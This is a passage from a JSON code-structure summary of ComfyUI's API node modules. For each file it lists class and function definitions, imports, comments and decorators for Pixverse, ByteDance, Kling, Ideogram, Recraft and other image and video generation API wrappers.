          "from typing_extensions import override",
          "import folder_paths",
          "from comfy_api.latest import IO, ComfyExtension, Input",
          "from comfy_api_nodes.apis import (",
          "from comfy_api_nodes.apis.openai_api import (",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# validate raw JSON response",
          "# Initialize list to store image tensors",
          "# Process each image in the data array",
          "# build the operation",
          "# https://platform.openai.com/docs/pricing",
          "# Create response",
          "# Get result output"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 9,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_pixverse.py",
        "docstrings": [],
        "function_defs": [
          "def define_schema(cls) -> IO.Schema:",
          "def execute(cls, template: str) -> IO.NodeOutput:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:"
        ],
        "class_defs": [
          "class PixverseTemplateNode(IO.ComfyNode):",
          "class PixverseTextToVideoNode(IO.ComfyNode):",
          "class PixverseImageToVideoNode(IO.ComfyNode):",
          "class PixverseTransitionVideoNode(IO.ComfyNode):",
          "class PixVerseExtension(ComfyExtension):"
        ],
        "imports": [
          "import torch",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension",
          "from comfy_api_nodes.apis.pixverse_api import (",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# 1080p is limited to 5 seconds duration",
          "# only normal motion_mode supported for 1080p or for non-5 second duration",
          "# 1080p is limited to 5 seconds duration",
          "# only normal motion_mode supported for 1080p or for non-5 second duration",
          "# 1080p is limited to 5 seconds duration",
          "# only normal motion_mode supported for 1080p or for non-5 second duration"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 5,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_bytedance.py",
        "docstrings": [],
        "function_defs": [
          "def get_image_url_from_response(response: ImageTaskCreationResponse) -> str:",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def raise_if_text_params(prompt: str, text_params: list[str]) -> None:"
        ],
        "class_defs": [
          "class ByteDanceImageNode(IO.ComfyNode):",
          "class ByteDanceImageEditNode(IO.ComfyNode):",
          "class ByteDanceSeedreamNode(IO.ComfyNode):",
          "class ByteDanceTextToVideoNode(IO.ComfyNode):",
          "class ByteDanceImageToVideoNode(IO.ComfyNode):",
          "class ByteDanceFirstLastFrameNode(IO.ComfyNode):",
          "class ByteDanceImageReferenceNode(IO.ComfyNode):",
          "class ByteDanceExtension(ComfyExtension):"
        ],
        "imports": [
          "import logging",
          "import math",
          "import torch",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension, Input",
          "from comfy_api_nodes.apis.bytedance_api import (",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# Long-running tasks endpoints(e.g., video)"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 5,
        "error_handling": 10,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_ltxv.py",
        "docstrings": [],
        "function_defs": [
          "def define_schema(cls):",
          "def define_schema(cls):"
        ],
        "class_defs": [
          "class ExecuteTaskRequest(BaseModel):",
          "class TextToVideoNode(IO.ComfyNode):",
          "class ImageToVideoNode(IO.ComfyNode):",
          "class LtxvApiExtension(ComfyExtension):"
        ],
        "imports": [
          "from io import BytesIO",
          "from pydantic import BaseModel, Field",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension, Input, InputImpl",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_ideogram.py",
        "docstrings": [],
        "function_defs": [
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):"
        ],
        "class_defs": [
          "class IdeogramV1(IO.ComfyNode):",
          "class IdeogramV2(IO.ComfyNode):",
          "class IdeogramV3(IO.ComfyNode):",
          "class IdeogramExtension(ComfyExtension):"
        ],
        "imports": [
          "from io import BytesIO",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension",
          "from PIL import Image",
          "import numpy as np",
          "import torch",
          "from comfy_api_nodes.apis import (",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# Initialize list to store image tensors",
          "# Using functions from apinode_utils.py to handle downloading and processing",
          "# Stack tensors to match (N, width, height, channels)",
          "# Determine the model based on turbo setting",
          "#\"color_palette\": (",
          "#    IO.STRING,",
          "#    {",
          "#        \"multiline\": False,",
          "#        \"default\": \"\",",
          "#        \"tooltip\": \"Color palette preset name or hex colors with weights\",",
          "#    },",
          "#),",
          "# Determine the model based on turbo setting",
          "# Handle resolution vs aspect_ratio logic",
          "# If resolution is not AUTO, it overrides aspect_ratio",
          "# Check if both image and mask are provided for editing mode",
          "# Process image and mask",
          "# Resize mask to match image dimension",
          "# Invert mask, as Ideogram API will edit black areas instead of white areas (opposite of convention).",
          "# Validate mask dimensions match image",
          "# Process image",
          "# Process mask - white areas will be replaced",
          "# Create edit request",
          "# Add optional parameters",
          "# If only one of image or mask is provided, raise an error",
          "# Create generation request",
          "# Handle resolution vs aspect ratio",
          "# Add optional parameters"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 3,
        "error_handling": 11,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/topaz_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ImageEnhanceRequest(BaseModel):",
          "class ImageAsyncTaskResponse(BaseModel):",
          "class ImageStatusResponse(BaseModel):",
          "class ImageDownloadResponse(BaseModel):",
          "class Resolution(BaseModel):",
          "class CreateCreateVideoRequestSource(BaseModel):",
          "class VideoFrameInterpolationFilter(BaseModel):",
          "class VideoEnhancementFilter(BaseModel):",
          "class OutputInformationVideo(BaseModel):",
          "class Overrides(BaseModel):",
          "class CreateVideoRequest(BaseModel):",
          "class CreateVideoResponse(BaseModel):",
          "class VideoAcceptResponse(BaseModel):",
          "class VideoCompleteUploadRequestPart(BaseModel):",
          "class VideoCompleteUploadRequest(BaseModel):",
          "class VideoCompleteUploadResponse(BaseModel):",
          "class VideoStatusResponseEstimates(BaseModel):",
          "class VideoStatusResponseDownloadUrl(BaseModel):",
          "class VideoStatusResponse(BaseModel):"
        ],
        "imports": [
          "from typing import Optional, Union",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/kling_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class OmniProText2VideoRequest(BaseModel):",
          "class OmniParamImage(BaseModel):",
          "class OmniParamVideo(BaseModel):",
          "class OmniProFirstLastFrameRequest(BaseModel):",
          "class OmniProReferences2VideoRequest(BaseModel):",
          "class TaskStatusVideoResult(BaseModel):",
          "class TaskStatusImageResult(BaseModel):",
          "class TaskStatusResults(BaseModel):",
          "class TaskStatusResponseData(BaseModel):",
          "class TaskStatusResponse(BaseModel):",
          "class OmniImageParamImage(BaseModel):",
          "class OmniProImageRequest(BaseModel):",
          "class TextToVideoWithAudioRequest(BaseModel):",
          "class ImageToVideoWithAudioRequest(BaseModel):",
          "class MotionControlRequest(BaseModel):"
        ],
        "imports": [
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/bfl_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class BFLOutputFormat(str, Enum):",
          "class BFLFluxExpandImageRequest(BaseModel):",
          "class BFLFluxFillImageRequest(BaseModel):",
          "class BFLFluxProGenerateRequest(BaseModel):",
          "class Flux2ProGenerateRequest(BaseModel):",
          "class BFLFluxKontextProGenerateRequest(BaseModel):",
          "class BFLFluxProUltraGenerateRequest(BaseModel):",
          "class BFLFluxProGenerateResponse(BaseModel):",
          "class BFLStatus(str, Enum):",
          "class BFLFluxStatusResponse(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "from enum import Enum",
          "from typing import Any, Dict, Optional",
          "from pydantic import BaseModel, Field, confloat, conint"
        ],
        "comments": [
          "# image_prompt_strength: Optional[confloat(ge=0.0, le=1.0)] = Field(",
          "#     None, description='Blend between the prompt and the image prompt.'",
          "# )"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/recraft_api.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, r: int, g: int, b: int):",
          "def create_api_model(self):",
          "def __init__(self):",
          "def get_first(self):",
          "def add(self, color: RecraftColor):",
          "def create_api_model(self):",
          "def clone(self):",
          "def clone_and_merge(self, other: RecraftColorChain):",
          "def __init__(self, colors: RecraftColorChain=None, background_color: RecraftColorChain=None,",
          "def create_api_model(self):",
          "def __init__(self, style: str=None, substyle: str=None, style_id: str=None):",
          "def get_v3_substyles(style_v3: str, include_none=True) -> list[str]:"
        ],
        "class_defs": [
          "class RecraftColor:",
          "class RecraftColorChain:",
          "class RecraftControls:",
          "class RecraftStyle:",
          "class RecraftIO:",
          "class RecraftStyleV3(str, Enum):",
          "class RecraftModel(str, Enum):",
          "class RecraftImageSize(str, Enum):",
          "class RecraftColorObject(BaseModel):",
          "class RecraftControlsObject(BaseModel):",
          "class RecraftImageGenerationRequest(BaseModel):",
          "class RecraftReturnedObject(BaseModel):",
          "class RecraftImageGenerationResponse(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "from enum import Enum",
          "from typing import Optional",
          "from pydantic import BaseModel, Field, conint, confloat"
        ],
        "comments": [
          "#any = 'any' NOTE: this does not work for some reason... why?",
          "# text_layout"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class APIKey(BaseModel):",
          "class APIKeyWithPlaintext(APIKey):",
          "class AuditLog(BaseModel):",
          "class BFLAsyncResponse(BaseModel):",
          "class BFLAsyncWebhookResponse(BaseModel):",
          "class CannyHighThreshold(RootModel[int]):",
          "class CannyLowThreshold(RootModel[int]):",
          "class Guidance(RootModel[float]):",
          "class Steps(RootModel[int]):",
          "class WebhookUrl(RootModel[AnyUrl]):",
          "class BFLFluxKontextMaxGenerateRequest(BaseModel):",
          "class BFLFluxKontextMaxGenerateResponse(BaseModel):",
          "class BFLFluxKontextProGenerateRequest(BaseModel):",
          "class BFLFluxKontextProGenerateResponse(BaseModel):",
          "class OutputFormat(str, Enum):",
          "class BFLFluxPro11GenerateRequest(BaseModel):",
          "class BFLFluxPro11GenerateResponse(BaseModel):",
          "class Bottom(RootModel[int]):",
          "class Guidance2(RootModel[float]):",
          "class Left(RootModel[int]):",
          "class Right(RootModel[int]):",
          "class Steps2(RootModel[int]):",
          "class Top(RootModel[int]):",
          "class BFLFluxProGenerateRequest(BaseModel):",
          "class BFLFluxProGenerateResponse(BaseModel):",
          "class BFLOutputFormat(str, Enum):",
          "class BFLValidationError(BaseModel):",
          "class Status(str, Enum):",
          "class ClaimMyNodeRequest(BaseModel):",
          "class ComfyNode(BaseModel):",
          "class ComfyNodeCloudBuildInfo(BaseModel):",
          "class Status1(str, Enum):",
          "class Type(str, Enum):",
          "class ComputerToolCall(BaseModel):",
          "class Environment(str, Enum):",
          "class Type1(str, Enum):",
          "class ComputerUsePreviewTool(BaseModel):",
          "class CreateAPIKeyRequest(BaseModel):",
          "class Customer(BaseModel):",
          "class CustomerStorageResourceResponse(BaseModel):",
          "class Role(str, Enum):",
          "class Type2(str, Enum):",
          "class Error(BaseModel):",
          "class ErrorResponse(BaseModel):",
          "class Type3(str, Enum):",
          "class FileSearchTool(BaseModel):",
          "class Result(BaseModel):",
          "class Status2(str, Enum):",
          "class Type4(str, Enum):",
          "class FileSearchToolCall(BaseModel):",
          "class Type5(str, Enum):",
          "class FunctionTool(BaseModel):",
          "class Status3(str, Enum):",
          "class Type6(str, Enum):",
          "class FunctionToolCall(BaseModel):",
          "class GeminiCitation(BaseModel):",
          "class GeminiCitationMetadata(BaseModel):",
          "class Role1(str, Enum):",
          "class GeminiFunctionDeclaration(BaseModel):",
          "class GeminiGenerationConfig(BaseModel):",
          "class GeminiMimeType(str, Enum):",
          "class GeminiOffset(BaseModel):",
          "class GeminiSafetyCategory(str, Enum):",
          "class Probability(str, Enum):",
          "class GeminiSafetyRating(BaseModel):",
          "class GeminiSafetyThreshold(str, Enum):",
          "class GeminiTextPart(BaseModel):",
          "class GeminiTool(BaseModel):",
          "class GeminiVideoMetadata(BaseModel):",
          "class GitCommitSummary(BaseModel):",
          "class GithubEnterprise(BaseModel):",
          "class RepositorySelection(str, Enum):",
          "class GithubOrganization(BaseModel):",
          "class State(str, Enum):",
          "class Action(str, Enum):",
          "class Type7(str, Enum):",
          "class GithubUser(BaseModel):",
          "class IdeogramColorPalette1(BaseModel):",
          "class Member(BaseModel):",
          "class IdeogramColorPalette2(BaseModel):",
          "class IdeogramColorPalette(",
          "class ImageRequest(BaseModel):",
          "class IdeogramGenerateRequest(BaseModel):",
          "class Datum(BaseModel):",
          "class IdeogramGenerateResponse(BaseModel):",
          "class StyleCode(RootModel[str]):",
          "class Datum1(BaseModel):",
          "class IdeogramV3IdeogramResponse(BaseModel):",
          "class RenderingSpeed1(str, Enum):",
          "class IdeogramV3ReframeRequest(BaseModel):",
          "class MagicPrompt(str, Enum):",
          "class StyleType(str, Enum):",
          "class IdeogramV3RemixRequest(BaseModel):",
          "class IdeogramV3ReplaceBackgroundRequest(BaseModel):",
          "class ColorPalette(BaseModel):",
          "class MagicPrompt2(str, Enum):",
          "class StyleType1(str, Enum):",
          "class ImagenImageGenerationInstance(BaseModel):",
          "class AspectRatio(str, Enum):",
          "class PersonGeneration(str, Enum):",
          "class SafetySetting(str, Enum):",
          "class ImagenImagePrediction(BaseModel):",
          "class MimeType(str, Enum):",
          "class ImagenOutputOptions(BaseModel):",
          "class Includable(str, Enum):",
          "class Type8(str, Enum):",
          "class InputFileContent(BaseModel):",
          "class Detail(str, Enum):",
          "class Type9(str, Enum):",
          "class InputImageContent(BaseModel):",
          "class Role3(str, Enum):",
          "class Type10(str, Enum):",
          "class Type11(str, Enum):",
          "class InputTextContent(BaseModel):",
          "class KlingAudioUploadType(str, Enum):",
          "class KlingCameraConfig(BaseModel):",
          "class KlingCameraControlType(str, Enum):",
          "class KlingCharacterEffectModelName(str, Enum):",
          "class KlingDualCharacterEffectsScene(str, Enum):",
          "class KlingDualCharacterImages(RootModel[List[str]]):",
          "class KlingErrorResponse(BaseModel):",
          "class Trajectory(BaseModel):",
          "class DynamicMask(BaseModel):",
          "class TaskInfo(BaseModel):",
          "class KlingImageGenAspectRatio(str, Enum):",
          "class KlingImageGenImageReferenceType(str, Enum):",
          "class KlingImageGenModelName(str, Enum):",
          "class KlingImageGenerationsRequest(BaseModel):",
          "class KlingImageResult(BaseModel):",
          "class KlingLipSyncMode(str, Enum):",
          "class KlingLipSyncVoiceLanguage(str, Enum):",
          "class ResourcePackType(str, Enum):",
          "class Status5(str, Enum):",
          "class ResourcePackSubscribeInfo(BaseModel):",
          "class Data3(BaseModel):",
          "class KlingResourcePackageResponse(BaseModel):",
          "class KlingSingleImageEffectDuration(str, Enum):",
          "class KlingSingleImageEffectModelName(str, Enum):",
          "class KlingSingleImageEffectsScene(str, Enum):",
          "class KlingTaskStatus(str, Enum):",
          "class KlingTextToVideoModelName(str, Enum):",
          "class KlingVideoGenAspectRatio(str, Enum):",
          "class KlingVideoGenCfgScale(RootModel[float]):",
          "class KlingVideoGenDuration(str, Enum):",
          "class KlingVideoGenMode(str, Enum):",
          "class KlingVideoGenModelName(str, Enum):",
          "class KlingVideoResult(BaseModel):",
          "class KlingVirtualTryOnModelName(str, Enum):",
          "class KlingVirtualTryOnRequest(BaseModel):",
          "class TaskResult6(BaseModel):",
          "class Data7(BaseModel):",
          "class KlingVirtualTryOnResponse(BaseModel):",
          "class LumaAspectRatio(str, Enum):",
          "class LumaAssets(BaseModel):",
          "class GenerationType(str, Enum):",
          "class LumaAudioGenerationRequest(BaseModel):",
          "class LumaError(BaseModel):",
          "class Type12(str, Enum):",
          "class LumaGenerationReference(BaseModel):",
          "class GenerationType1(str, Enum):",
          "class LumaGenerationType(str, Enum):",
          "class GenerationType2(str, Enum):",
          "class LumaImageIdentity(BaseModel):",
          "class LumaImageModel(str, Enum):",
          "class LumaImageRef(BaseModel):",
          "class Type13(str, Enum):",
          "class LumaImageReference(BaseModel):",
          "class LumaKeyframe(RootModel[Union[LumaGenerationReference, LumaImageReference]]):",
          "class LumaKeyframes(BaseModel):",
          "class LumaModifyImageRef(BaseModel):",
          "class LumaState(str, Enum):",
          "class GenerationType3(str, Enum):",
          "class LumaVideoModel(str, Enum):",
          "class LumaVideoModelOutputDuration1(str, Enum):",
          "class LumaVideoModelOutputDuration(",
          "class LumaVideoModelOutputResolution1(str, Enum):",
          "class LumaVideoModelOutputResolution(",
          "class MachineStats(BaseModel):",
          "class MinimaxBaseResponse(BaseModel):",
          "class File(BaseModel):",
          "class MinimaxFileRetrieveResponse(BaseModel):",
          "class Status6(str, Enum):",
          "class MinimaxTaskResultResponse(BaseModel):",
          "class MiniMaxModel(str, Enum):",
          "class SubjectReferenceItem(BaseModel):",
          "class MinimaxVideoGenerationRequest(BaseModel):",
          "class MinimaxVideoGenerationResponse(BaseModel):",
          "class Modality(str, Enum):",
          "class ModalityTokenCount(BaseModel):",
          "class Truncation(str, Enum):",
          "class ModelResponseProperties(BaseModel):",
          "class Keyframes(BaseModel):",
          "class MoonvalleyPromptResponse(BaseModel):",
          "class MoonvalleyTextToVideoInferenceParams(BaseModel):",
          "class MoonvalleyTextToVideoRequest(BaseModel):",
          "class MoonvalleyUploadFileRequest(BaseModel):",
          "class MoonvalleyUploadFileResponse(BaseModel):",
          "class MoonvalleyVideoToVideoInferenceParams(BaseModel):",
          "class ControlType(str, Enum):",
          "class MoonvalleyVideoToVideoRequest(BaseModel):",
          "class NodeStatus(str, Enum):",
          "class NodeVersionIdentifier(BaseModel):",
          "class NodeVersionStatus(str, Enum):",
          "class NodeVersionUpdateRequest(BaseModel):",
          "class Moderation(str, Enum):",
          "class OutputFormat1(str, Enum):",
          "class OpenAIImageEditRequest(BaseModel):",
          "class Background(str, Enum):",
          "class Quality(str, Enum):",
          "class ResponseFormat(str, Enum):",
          "class Style(str, Enum):",
          "class OpenAIImageGenerationRequest(BaseModel):",
          "class Datum2(BaseModel):",
          "class InputTokensDetails(BaseModel):",
          "class Usage(BaseModel):",
          "class OpenAIImageGenerationResponse(BaseModel):",
          "class OpenAIModels(str, Enum):",
          "class Reason(str, Enum):",
          "class IncompleteDetails(BaseModel):",
          "class Object(str, Enum):",
          "class Status7(str, Enum):",
          "class Type14(str, Enum):",
          "class OutputAudioContent(BaseModel):",
          "class Role4(str, Enum):",
          "class Type15(str, Enum):",
          "class Type16(str, Enum):",
          "class OutputTextContent(BaseModel):",
          "class PersonalAccessToken(BaseModel):",
          "class AspectRatio1(RootModel[float]):",
          "class IngredientsMode(str, Enum):",
          "class PikaBodyGenerate22C2vGenerate22PikascenesPost(BaseModel):",
          "class PikaBodyGeneratePikadditionsGeneratePikadditionsPost(BaseModel):",
          "class PikaBodyGeneratePikaswapsGeneratePikaswapsPost(BaseModel):",
          "class PikaDurationEnum(int, Enum):",
          "class PikaGenerateResponse(BaseModel):",
          "class PikaResolutionEnum(str, Enum):",
          "class PikaStatusEnum(str, Enum):",
          "class PikaValidationError(BaseModel):",
          "class PikaVideoResponse(BaseModel):",
          "class Pikaffect(str, Enum):",
          "class Resp(BaseModel):",
          "class PixverseImageUploadResponse(BaseModel):",
          "class Duration(int, Enum):",
          "class Model1(str, Enum):",
          "class MotionMode(str, Enum):",
          "class Quality1(str, Enum):",
          "class Style1(str, Enum):",
          "class PixverseImageVideoRequest(BaseModel):",
          "class AspectRatio2(str, Enum):",
          "class PixverseTextVideoRequest(BaseModel):",
          "class PixverseTransitionVideoRequest(BaseModel):",
          "class Resp1(BaseModel):",
          "class PixverseVideoResponse(BaseModel):",
          "class Status8(int, Enum):",
          "class Resp2(BaseModel):",
          "class PixverseVideoResultResponse(BaseModel):",
          "class PublisherStatus(str, Enum):",
          "class PublisherUser(BaseModel):",
          "class RgbItem(RootModel[int]):",
          "class RGBColor(BaseModel):",
          "class GenerateSummary(str, Enum):",
          "class Summary(str, Enum):",
          "class ReasoningEffort(str, Enum):",
          "class Status9(str, Enum):",
          "class Type17(str, Enum):",
          "class SummaryItem(BaseModel):",
          "class Type18(str, Enum):",
          "class ReasoningItem(BaseModel):",
          "class RecraftImageColor(BaseModel):",
          "class RecraftImageFeatures(BaseModel):",
          "class RecraftImageFormat(str, Enum):",
          "class Controls(BaseModel):",
          "class RecraftImageGenerationRequest(BaseModel):",
          "class Datum3(BaseModel):",
          "class RecraftImageGenerationResponse(BaseModel):",
          "class RecraftImageStyle(str, Enum):",
          "class RecraftImageSubStyle(str, Enum):",
          "class RecraftResponseFormat(str, Enum):",
          "class RecraftTextLayoutItem(BaseModel):",
          "class RecraftTransformModel(str, Enum):",
          "class RecraftUserControls(BaseModel):",
          "class Attention(str, Enum):",
          "class Project(str, Enum):",
          "class ReleaseNote(BaseModel):",
          "class RenderingSpeed(str, Enum):",
          "class Type19(str, Enum):",
          "class Type20(str, Enum):",
          "class Type21(str, Enum):",
          "class Type22(str, Enum):",
          "class ResponseErrorCode(str, Enum):",
          "class Type23(str, Enum):",
          "class ResponseErrorEvent(BaseModel):",
          "class Type24(str, Enum):",
          "class Type25(str, Enum):",
          "class ResponseFormatJsonObject(BaseModel):",
          "class ResponseFormatJsonSchemaSchema(BaseModel):",
          "class Type26(str, Enum):",
          "class ResponseFormatText(BaseModel):",
          "class Type27(str, Enum):",
          "class Type28(str, Enum):",
          "class Type29(str, Enum):",
          "class Type30(str, Enum):",
          "class Truncation1(str, Enum):",
          "class InputTokensDetails1(BaseModel):",
          "class OutputTokensDetails(BaseModel):",
          "class ResponseUsage(BaseModel):",
          "class Rodin3DCheckStatusRequest(BaseModel):",
          "class Rodin3DDownloadRequest(BaseModel):",
          "class RodinGenerateJobsData(BaseModel):",
          "class RodinMaterialType(str, Enum):",
          "class RodinMeshModeType(str, Enum):",
          "class RodinQualityType(str, Enum):",
          "class RodinResourceItem(BaseModel):",
          "class RodinStatusOptions(str, Enum):",
          "class RodinTierType(str, Enum):",
          "class RunwayAspectRatioEnum(str, Enum):",
          "class RunwayDurationEnum(int, Enum):",
          "class RunwayImageToVideoResponse(BaseModel):",
          "class RunwayModelEnum(str, Enum):",
          "class Position(str, Enum):",
          "class RunwayPromptImageDetailedObject(BaseModel):",
          "class RunwayPromptImageObject(",
          "class RunwayTaskStatusEnum(str, Enum):",
          "class RunwayTaskStatusResponse(BaseModel):",
          "class RunwayTextToImageAspectRatioEnum(str, Enum):",
          "class Model4(str, Enum):",
          "class ReferenceImage(BaseModel):",
          "class RunwayTextToImageRequest(BaseModel):",
          "class RunwayTextToImageResponse(BaseModel):",
          "class Name(str, Enum):",
          "class StabilityContentModerationResponse(BaseModel):",
          "class StabilityCreativity(RootModel[float]):",
          "class StabilityError(BaseModel):",
          "class StabilityGenerationID(RootModel[str]):",
          "class Status10(str, Enum):",
          "class StabilityGetResultResponse202(BaseModel):",
          "class AspectRatio3(str, Enum):",
          "class Mode(str, Enum):",
          "class Model5(str, Enum):",
          "class OutputFormat3(str, Enum):",
          "class StylePreset(str, Enum):",
          "class StabilityImageGenerationSD3Request(BaseModel):",
          "class FinishReason(str, Enum):",
          "class StabilityImageGenrationSD3Response200(BaseModel):",
          "class StabilityImageGenrationSD3Response400(BaseModel):",
          "class StabilityImageGenrationSD3Response413(BaseModel):",
          "class StabilityImageGenrationSD3Response422(BaseModel):",
          "class StabilityImageGenrationSD3Response429(BaseModel):",
          "class StabilityImageGenrationSD3Response500(BaseModel):",
          "class OutputFormat4(str, Enum):",
          "class StabilityImageGenrationUpscaleConservativeRequest(BaseModel):",
          "class StabilityImageGenrationUpscaleConservativeResponse200(BaseModel):",
          "class StabilityImageGenrationUpscaleConservativeResponse400(BaseModel):",
          "class StabilityImageGenrationUpscaleConservativeResponse413(BaseModel):",
          "class StabilityImageGenrationUpscaleConservativeResponse422(BaseModel):",
          "class StabilityImageGenrationUpscaleConservativeResponse429(BaseModel):",
          "class StabilityImageGenrationUpscaleConservativeResponse500(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeRequest(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeResponse200(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeResponse400(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeResponse413(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeResponse422(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeResponse429(BaseModel):",
          "class StabilityImageGenrationUpscaleCreativeResponse500(BaseModel):",
          "class StabilityImageGenrationUpscaleFastRequest(BaseModel):",
          "class StabilityImageGenrationUpscaleFastResponse200(BaseModel):",
          "class StabilityImageGenrationUpscaleFastResponse400(BaseModel):",
          "class StabilityImageGenrationUpscaleFastResponse413(BaseModel):",
          "class StabilityImageGenrationUpscaleFastResponse422(BaseModel):",
          "class StabilityImageGenrationUpscaleFastResponse429(BaseModel):",
          "class StabilityImageGenrationUpscaleFastResponse500(BaseModel):",
          "class StabilityStabilityClientID(RootModel[str]):",
          "class StabilityStabilityClientUserID(RootModel[str]):",
          "class StabilityStabilityClientVersion(RootModel[str]):",
          "class StorageFile(BaseModel):",
          "class StripeAddress(BaseModel):",
          "class StripeAmountDetails(BaseModel):",
          "class StripeBillingDetails(BaseModel):",
          "class Checks(BaseModel):",
          "class ExtendedAuthorization(BaseModel):",
          "class IncrementalAuthorization(BaseModel):",
          "class Multicapture(BaseModel):",
          "class NetworkToken(BaseModel):",
          "class Overcapture(BaseModel):",
          "class StripeCardDetails(BaseModel):",
          "class Object1(str, Enum):",
          "class Object2(str, Enum):",
          "class Type31(str, Enum):",
          "class StripeOutcome(BaseModel):",
          "class Object3(str, Enum):",
          "class StripePaymentMethodDetails(BaseModel):",
          "class Card(BaseModel):",
          "class StripePaymentMethodOptions(BaseModel):",
          "class StripeRefundList(BaseModel):",
          "class StripeRequestInfo(BaseModel):",
          "class StripeShipping(BaseModel):",
          "class Type32(str, Enum):",
          "class TextResponseFormatJsonSchema(BaseModel):",
          "class Type33(str, Enum):",
          "class ToolChoiceFunction(BaseModel):",
          "class ToolChoiceOptions(str, Enum):",
          "class Type34(str, Enum):",
          "class ToolChoiceTypes(BaseModel):",
          "class TripoAnimation(str, Enum):",
          "class TripoBalance(BaseModel):",
          "class TripoConvertFormat(str, Enum):",
          "class Code(int, Enum):",
          "class TripoErrorResponse(BaseModel):",
          "class TripoImageToModel(str, Enum):",
          "class TripoModelStyle(str, Enum):",
          "class TripoModelVersion(str, Enum):",
          "class TripoMultiviewMode(str, Enum):",
          "class TripoMultiviewToModel(str, Enum):",
          "class TripoOrientation(str, Enum):",
          "class TripoResponseSuccessCode(RootModel[int]):",
          "class TripoSpec(str, Enum):",
          "class TripoStandardFormat(str, Enum):",
          "class TripoStylizeOptions(str, Enum):",
          "class Code1(int, Enum):",
          "class Data9(BaseModel):",
          "class TripoSuccessTask(BaseModel):",
          "class Topology(str, Enum):",
          "class Output(BaseModel):",
          "class Status11(str, Enum):",
          "class TripoTask(BaseModel):",
          "class TripoTextToModel(str, Enum):",
          "class TripoTextureAlignment(str, Enum):",
          "class TripoTextureFormat(str, Enum):",
          "class TripoTextureQuality(str, Enum):",
          "class TripoTopology(str, Enum):",
          "class TripoTypeAnimatePrerigcheck(str, Enum):",
          "class TripoTypeAnimateRetarget(str, Enum):",
          "class TripoTypeAnimateRig(str, Enum):",
          "class TripoTypeConvertModel(str, Enum):",
          "class TripoTypeRefineModel(str, Enum):",
